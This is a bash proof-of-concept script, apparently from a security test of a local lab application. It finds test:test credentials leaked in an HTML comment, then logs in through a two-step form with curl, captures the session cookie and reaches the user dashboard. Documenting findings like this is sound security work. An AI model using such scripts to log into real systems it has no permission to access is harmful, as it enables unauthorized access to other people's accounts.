#!/bin/bash

# POC: Default Credentials Authentication Bypass
# Demonstrates complete authentication bypass using publicly disclosed credentials test:test

TARGET="http://localhost:8082"
USERNAME="test"
PASSWORD="test"

echo "=========================================="
echo "POC: Default Credentials Authentication Bypass"
echo "Target: $TARGET"
echo "Credentials: $USERNAME:$PASSWORD"
echo "=========================================="
echo ""

# Step 1: Verify the HTML comment disclosure
echo "[*] Step 1: Checking for HTML comment disclosure on login page..."
COMMENT_CHECK=$(curl -s "$TARGET/" | grep -o "TODO: Delete the testing account (test:test)")
if [ -n "$COMMENT_CHECK" ]; then
    echo "[+] FOUND: HTML comment discloses default credentials!"
    echo "    Comment: <!-- $COMMENT_CHECK -->"
else
    echo "[-] Warning: HTML comment not found in response"
fi
echo ""

# Step 2: First authentication step - submit username
echo "[*] Step 2: Submitting username to initiate authentication..."
STEP1_RESPONSE=$(curl -s -i -X POST "$TARGET/" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$USERNAME" \
    -c /tmp/poc_cookies.txt)

STEP1_STATUS=$(echo "$STEP1_RESPONSE" | grep "HTTP/" | head -n1 | awk '{print $2}')
STEP1_LOCATION=$(echo "$STEP1_RESPONSE" | grep -i "Location:" | awk '{print $2}' | tr -d '\r')

echo "    Status: $STEP1_STATUS"
echo "    Redirect: $STEP1_LOCATION"

if [[ "$STEP1_STATUS" != "302" ]] || [[ "$STEP1_LOCATION" != */password/$USERNAME* ]]; then
    echo "[!] Error: Unexpected response in Step 1"
    exit 1
fi
echo "[+] Step 1 successful - redirected to password page"
echo ""

# Step 3: Extract user_id from the password page
echo "[*] Step 3: Extracting user_id from password page..."
PASSWORD_PAGE=$(curl -s -b /tmp/poc_cookies.txt "$TARGET/password/$USERNAME")
USER_ID=$(echo "$PASSWORD_PAGE" | grep -o 'name="user_id" value="[0-9]*"' | grep -o '[0-9]*')

if [ -z "$USER_ID" ]; then
    echo "[!] Error: Could not extract user_id"
    exit 1
fi
echo "    Extracted user_id: $USER_ID"
echo ""

# Step 4: Second authentication step - submit password
echo "[*] Step 4: Submitting password with user_id to complete authentication..."
STEP2_RESPONSE=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$USERNAME&user_id=$USER_ID&password=$PASSWORD" \
    -b /tmp/poc_cookies.txt \
    -c /tmp/poc_cookies.txt)

STEP2_STATUS=$(echo "$STEP2_RESPONSE" | grep "HTTP/" | head -n1 | awk '{print $2}')
STEP2_LOCATION=$(echo "$STEP2_RESPONSE" | grep -i "Location:" | awk '{print $2}' | tr -d '\r')
SESSION_COOKIE=$(echo "$STEP2_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/')

echo "    Status: $STEP2_STATUS"
echo "    Redirect: $STEP2_LOCATION"
echo "    Session Cookie: ${SESSION_COOKIE:0:50}..."

if [[ "$STEP2_STATUS" != "302" ]] || [[ "$STEP2_LOCATION" != */dashboard* ]]; then
    echo "[!] Error: Authentication failed - invalid credentials or unexpected response"
    exit 1
fi
echo "[+] Step 2 successful - authentication complete, session established"
echo ""

# Step 5: Access authenticated dashboard
echo "[*] Step 5: Accessing authenticated dashboard..."
DASHBOARD_RESPONSE=$(curl -s -b /tmp/poc_cookies.txt "$TARGET/dashboard?username=$USERNAME")

# Check for successful authentication indicators
if echo "$DASHBOARD_RESPONSE" | grep -q "Welcome"; then
    USERNAME_DISPLAYED=$(echo "$DASHBOARD_RESPONSE" | grep -o "Welcome, [^<]*" | sed 's/Welcome, //')
    echo "[+] AUTHENTICATION BYPASS SUCCESSFUL!"
    echo "    Dashboard accessed with user: $USERNAME_DISPLAYED"
    echo "    User ID: $USER_ID"
else
    echo "[!] Error: Dashboard access failed"
    exit 1
fi
echo ""

# Cleanup
rm -f /tmp/poc_cookies.txt

echo "=========================================="
echo "[+] POC COMPLETED SUCCESSFULLY"
echo "=========================================="
echo ""
echo "VULNERABILITY CONFIRMED:"
echo "  - Default credentials (test:test) are publicly disclosed in HTML comments"
echo "  - Credentials provide complete authentication bypass"
echo "  - Full access to authenticated user dashboard and functionality"
echo "  - No brute force or exploitation required"
echo ""
echo "SEVERITY: CRITICAL"
echo "IMPACT: Complete authentication bypass, unauthorized access to user accounts"
echo ""